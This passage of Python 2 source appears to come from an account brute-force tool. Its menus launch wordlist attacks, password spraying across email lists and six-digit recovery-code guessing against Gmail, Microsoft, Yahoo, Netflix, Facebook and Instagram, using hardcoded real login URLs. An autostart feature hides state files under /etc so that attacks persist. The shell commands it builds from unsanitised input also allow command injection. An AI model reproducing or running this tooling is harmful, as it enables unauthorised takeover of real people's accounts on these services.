	      while ( checki == 1) :
	       intrf()
	       print("\033[34m[1] Normal Bruteforce")
	       print("\033[34m[2] one password " )
	       cho = raw_input("selecte from menu :")
	       if cho == "1" :
		 typpe = 'normal'
	         email = str(raw_input("email :"))
	         passwordlist = str(raw_input("wordlist:"))
		 outstart = aoutostart()
	         if outstart == "y" or outstart == "Y":
			aoutostartcheck = True
	      		autostart_tst		
	      		aoutst_inf("true" , web , typpe , email , passwordlist)
		        bashfile()
	         gmail()
	         checki = 1
	       elif cho == "2" :
		 typpe = 'onepass'
		 email = str(raw_input("Password :"))
		 passwordlist = str(raw_input("emaillist:"))
		 outstart = aoutostart()
	         if outstart == "y" or outstart == "Y":
			aoutostartcheck = True
	      		autostart_tst		
	      		aoutst_inf("true" , web , typpe , email , passwordlist)
		        bashfile()
	         gmail1()
		 checki = 1



#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#microsoft : hotmail /outlook/office..
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	    elif choix == "2" or choix == "3" or choix == "4" :
	      web = 'microsoft'
	      checki = 1
	      while ( checki == 1 ) :
	       intrf()
	       print("\033[34m[1] Normal Bruteforce")
	       print("\033[34m[2] one password " )
	       cho = raw_input("selecte from menu :")
	       if cho == "1" :
		 typpe = 'normal'
	         email = str(raw_input("email :"))
	         passwordlist = str(raw_input("wordlist:"))
		 outstart = aoutostart()
	         if outstart == "y" or outstart == "Y":
			aoutostartcheck = True
	      		autostart_tst		
	      		aoutst_inf("true" , web , typpe , email , passwordlist)
		        bashfile()
	         microsoft()
	         checki = 1
	       elif cho == "2" :
		 typpe = 'onepass'
		 email = str(raw_input("Password :"))
		 passwordlist = str(raw_input("emailslist:"))
		 outstart = aoutostart()
	         if outstart == "y" or outstart == "Y":
		  	aoutostartcheck = True
	      		autostart_tst		
	      		aoutst_inf("true" , web , typpe , email , passwordlist)
		        bashfile()
	         microsoft1()
		 checki = 1



#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#                  Yahoo
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	    elif choix == "5" :
	      web = 'yahoo'
	      
	      checki = 1
	      while ( checki == 1) :
	       intrf()
	       print("\033[34m[1] Normal Bruteforce")
	       print("\033[34m[2] one password " )
	       cho = raw_input("selecte from menu :")


	       if cho == "1" :
		 typpe = 'normal'
		 email = str(raw_input("email :"))
		 passwordlist = str(raw_input("wordlist:"))

	         outstart = aoutostart()
	      	 if outstart == "y" or outstart == "Y":
		         aoutostartcheck = True
	            	 autostart_tst		
		    	 aoutst_inf("true" , web , typpe , email , passwordlist)
		    	 bashfile()

	         login = 'https://login.yahoo.com/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0'
	         yahoo()
	         checki = 1

	       elif cho == "2" :
		typpe = 'onepass'
		email = str(raw_input("Password:"))
		passwordlist = str(raw_input("emailslist:"))

	        outstart = aoutostart()
	      	if outstart == "y" or outstart == "Y":
			 aoutostartcheck = True
	            	 autostart_tst		
		    	 aoutst_inf("true" , web , typpe , email , passwordlist)
		    	 bashfile()

		login = 'https://login.yahoo.com/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0'
	        yahoo1()
		checki = 1


#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#                    Netflix
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


	    elif choix == "6" :
	      login = 'https://www.netflix.com/ma-en/Login'
	      web = 'netflix'
	      intrf()
	      checki = 1

	      while ( checki == 1) :
	       intrf()
	       print("\033[34m[1] Normal Bruteforce")
	       print("\033[34m[2] one password " )
	       cho = raw_input("selecte from menu :")


	       if cho == "1" :
		typpe = 'normal'
		email = str(raw_input("email :"))
		passwordlist = str(raw_input("wordlist:"))

	        outstart = aoutostart()
	      	if outstart == "y" or outstart == "Y":
			 aoutostartcheck = True
	            	 autostart_tst		
		    	 aoutst_inf("true" , web , typpe , email , passwordlist)
		    	 bashfile()

		
	        netflix()
	        checki = 1


	       elif cho == "2" :
	        
		typpe = 'onepass'
		email = str(raw_input("email :"))
		passwordlist = str(raw_input("emaillist:"))

	        outstart = aoutostart()
	      	if outstart == "y" or outstart == "Y":
			 aoutostartcheck = True
	            	 autostart_tst		
		    	 aoutst_inf("true" , web , typpe , email , passwordlist)
		    	 bashfile()
	        netflix1()
		checki = 1


#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#                 Facebook
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


	    elif choix == "7" :
	      web = 'facebook'
	      choixfbrt = 0
	      while (choixfbrt==0) :
		      intrf()
		      print("[1] Normal Bruteforce")
		      print("[2] User = pass " )
		      print("[3] One password " )
		      print("[4] Six digits ")
		      cho = raw_input("selecte from menu :")
		      if cho == "1" :
			typpe = 'normal'
			intrf()
			choixfbrt = 1
			email = str(raw_input("email or id or number :"))
			passwordlist = str(raw_input("wordlist:"))
	
			outstart = aoutostart()
			if outstart == "y" or outstart == "Y":
			 aoutostartcheck = True
			 autostart_tst		
		         aoutst_inf("true" , web , typpe , email , passwordlist)
		         bashfile()
			 passwordlist ="/etc/.rtabruter/." + passwordlist
			login = 'https://www.facebook.com/login.php?login_attempt=1'


			facebook()
        
#********
	
		      elif cho == "2" :
			intrf()
			choixfbrt = 1
			print("[1] login with email")
			print ("[2] login with number")
			ki_of = raw_input("electe from menu :")
			if ki_of == "1" :
		  	    intrf()
			    passwordlist = str(raw_input("wordlist:"))
			

			    outstart = aoutostart()
			    if outstart == "y" or outstart == "Y":
				aoutostartcheck = True
				autostart_tst
			        os.system("mkdir /etc/.rtabruter")
				os.system("cat " + passwordlist + " > /etc/.rtabruter/." + passwordlist)
				os.system("touch /etc/.rtabruter/.autorun")
				autstartfile = open("/etc/.rtabruter/.autorun", "w")
				bashfile()
	    		        print("to stop autostartup run this command :...")

				autstartfile.write("true\n")# aouto start status
				autstartfile.write("facebook\n")# website
				autstartfile.write("user_pass\n")# type of brtfc
				autstartfile.write("email\n")# type of brtfc
				autstartfile.write( "/etc/.rtabruter/" + passwordlist + "\n")	
				autstartfile.close()


			    login = 'https://www.facebook.com/login.php?login_attempt=1'
				
	
			   
	 	     	    
			    facebook1()
	
			    checko = 1
	

#*************
#number
			elif ki_of == "2" :
			 intrf()
			 print ("\033[93m[i]the numberphones list must be without country code!!\033[00m")
			 print"\033[1;34m"
		         codec = str(raw_input("country code :"))
			 passwordlist = str(raw_input("wordlist:"))
			 outstart = aoutostart()
			 if outstart == "y" or outstart == "Y":
				aoutostartcheck = True
				autostart_tst	

			        os.system("mkdir /etc/.rtabruter")
				os.system("cat " + passwordlist + " > /etc/.rtabruter/." + passwordlist)
				os.system("touch /etc/.rtabruter/.autorun")
				autstartfile = open("/etc/.rtabruter/.autorun", "w")	   			

				bashfile()
				autstartfile.write("true\n")# aouto start status
				autstartfile.write("facebook\n")# website
				autstartfile.write("user_pass\n")# type of brtfc
				autstartfile.write("number\n")# type of brtfc
				autstartfile.write(os.path.abspath(passwordlist) + "\n")# path of num	
				autstartfile.write(codec + "\n")# code country
				autstartfile.close()


			
			 login = 'https://www.facebook.com/login.php?login_attempt=1'


			 
			 facebooknumber(codec)
			
			 checko = 1
#******
		      elif cho == "3" :
			intrf()
	 		choixfbrt=1
			typpe = 'onepass'
			email = str(raw_input("password :"))
			passwordlist = str(raw_input("emails list:"))
			outstart = aoutostart()
			if outstart == "y" or outstart == "Y":
				aoutostartcheck = True
				autostart_tst
				aoutst_inf("true" , web , typpe , email , passwordlist)
				bashfile()
			login = 'https://www.facebook.com/login.php?login_attempt=1'


		        
			facebook2()
        

		      elif cho == "4" :
			intrf()
			choixfbrt=1
			intrf()
			typpe = 'sixdigit'
			print ("\033[1;93myou should ask a code recovery first !!\033[00m ")
			email = str(raw_input("id(dosen't work with email or number phone ) :"))
			passwordlist = str(raw_input("number list:"))
			outstart = aoutostart()
			if outstart == "y" or outstart == "Y":
				aoutostartcheck = True
				autostart_tst
				aoutst_inf("true" , web , typpe , email , passwordlist)
				bashfile()
	
	
			login = 'https://www.facebook.com/recover/password/?u=100010628019234&n=000000&fl=default_recover&sih=0'

			
			facebook_sixdigit()



#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#		Instagram
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	    elif choix == "8" :
	      login = 'http://www.instagram.com/accounts/login/'
	      web = 'netflix'
	      checki = 1
	      while ( checki == 1 ) :
	       intrf()
	       print("\033[34m[1] Normal Bruteforce")
	       print("\033[34m[2] one password " )
	       cho = raw_input("selecte from menu :")


	       if cho == "1" :
		typpe = 'normal'
		email = str(raw_input("email :"))
		passwordlist = str(raw_input("wordlist:"))

	        outstart = aoutostart()
	      	if outstart == "y" or outstart == "Y":
	            	 autostart_tst		
		    	 aoutst_inf("true" , web , typpe , email , passwordlist)
		    	 bashfile()

		
	        instagram()
	       


	       elif cho == "2" :
		typpe = 'onepass'
		email = str(raw_input("Password :"))
		passwordlist = str(raw_input("emailslist:"))

	        outstart = aoutostart()
	      	if outstart == "y" or outstart == "Y":
	            	 autostart_tst		
		    	 aoutst_inf("true" , web , typpe , email , passwordlist)
		    	 bashfile()
	        instagram()


	




